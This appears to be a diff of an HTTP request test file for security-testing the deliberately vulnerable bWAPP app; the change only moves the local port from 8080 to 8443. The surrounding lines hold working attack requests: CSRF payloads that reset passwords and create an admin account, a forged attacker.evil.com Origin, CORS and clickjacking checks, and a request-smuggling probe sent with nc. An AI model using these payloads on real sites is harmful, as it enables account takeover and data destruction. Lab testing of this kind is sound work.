@@ -13,7 +13,7 @@
 ###   logged-in bWAPP user who visits it has their password replaced.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -29,7 +29,7 @@ password=pwned&password_conf=pwned&form=submit
 ###   victim visits a page, attacker gets an admin account.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -44,7 +44,7 @@ login=attacker&password=attacker&email=attacker%40evil.com&secret=x&activated=on
 ###   and no token, so one cross-site POST wipes the data.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/sqli_7.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -58,7 +58,7 @@ entry_delete=1&blog=submit&form=submit
 ###   neither validates Origin/Referer nor sets SameSite on the session cookie.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Origin: http://attacker.evil.com
 Referer: http://attacker.evil.com/csrf.html
@@ -75,7 +75,7 @@ login=attacker2&password=attacker2&email=a2%40evil.com&secret=x&activated=on&adm
 ###   top of state-changing controls (delete, password change, transfer).
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/clickjacking.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, and NO X-Frame-Options / frame-ancestors in the response headers
 ### Fix: Content-Security-Policy: frame-ancestors 'none'
@@ -86,7 +86,7 @@ Cookie: {{authCookie}}
 ###           settings page is framable too
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/admin/ HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, settings page with no frame protection
 
@@ -97,7 +97,7 @@ Cookie: {{authCookie}}
 ###   victim visits can read it cross-origin. Response body is the proof.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret-cors-1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200
 ###   Access-Control-Allow-Origin: *
@@ -111,7 +111,7 @@ Cookie: {{authCookie}}
 ###   the fact that any page on that host can then read the secret.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret-cors-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Origin: http://intranet.itsecgames.com
 ### Expected: 200
@@ -126,7 +126,7 @@ Origin: http://intranet.itsecgames.com
 ###   to prove the CORS-01 finding is about the header, not the payload.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret-cors-3.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, body "Johnny's secret: I'm the Ghost Rider!" and NO
 ###           Access-Control-Allow-Origin - browsers block this cross-origin.
@@ -140,12 +140,12 @@ Cookie: {{authCookie}}
 ###   NOT SENT BY THE RUNNER: .NET's HttpWebRequest owns Content-Length and
 ###   Transfer-Encoding and silently rewrites both, so it cannot emit a
 ###   contradictory pair. Send this with a raw client to actually test it:
-###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 42\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc localhost 8080
+###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8443\r\nContent-Length: 42\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc localhost 8443
 ### ---------------------------------------------------------------------------
 ### SKIP
 ### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
 POST {{baseUrl}}/secret.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Length: 42
 Transfer-Encoding: chunked
